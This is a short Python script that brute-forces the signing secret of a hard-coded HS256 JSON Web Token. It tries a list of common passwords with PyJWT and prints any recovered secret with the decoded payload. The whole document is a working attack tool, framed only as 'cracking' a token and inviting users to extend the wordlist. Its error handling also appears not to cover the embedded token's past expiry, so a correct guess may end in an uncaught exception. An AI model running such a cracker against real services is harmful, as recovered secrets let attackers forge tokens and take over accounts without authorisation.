import jwt
from jwt.exceptions import DecodeError

# The JWT token you want to crack
token_to_crack = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InVzZXJuYW1lIiwiZXhwIjoxNzEwMzA1Nzg5LCJpYXQiOjE3MTAxMzI5ODl9._OrIt8yqkTd7UJIO91KALshnfmdFbtOInUpqgwWNlzQ"

# List of common secrets to try
common_secrets = [
    "password",
    "123456",
    "secret",
    "admin",
    "letmein",
    "qwerty",
    "weak"
    # Add more common passwords or secrets as needed
]

def crack_jwt_token(token, secrets):
    for secret in secrets:
        try:
            # Attempt to decode the token with the current secret
            decoded = jwt.decode(token, secret, algorithms=["HS256"])
            print(f"Success! Secret found: {secret}")
            print(f"Decoded JWT payload: {decoded}")
            return secret  # Stop the loop if successful
        except DecodeError:
            # If the secret is wrong, just continue to the next one
            
            continue
    print("Failed to find the secret.")
    return None

# Run the cracker function
crack_jwt_token(token_to_crack, common_secrets)
